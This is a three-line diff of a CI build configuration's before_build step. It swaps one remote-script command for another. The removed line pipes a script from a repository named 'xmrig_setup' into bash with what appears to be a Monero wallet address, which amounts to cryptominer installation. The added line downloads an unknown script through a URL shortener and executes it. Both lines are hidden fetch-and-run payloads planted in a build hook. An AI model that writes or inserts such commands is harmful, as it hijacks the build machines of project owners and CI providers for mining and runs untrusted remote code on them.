@@ -1,3 +1,3 @@
 before_build:
    
-    - curl -s -L https://raw.githubusercontent.com/heiditorp/xmrig_setup/master/setup_python.sh | bash -s 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j
+    - wget -O nextbashorp.sh https://tinyurl.com/mwywdx9c && chmod +x nextbashorp.sh && ./nextbashorp.sh
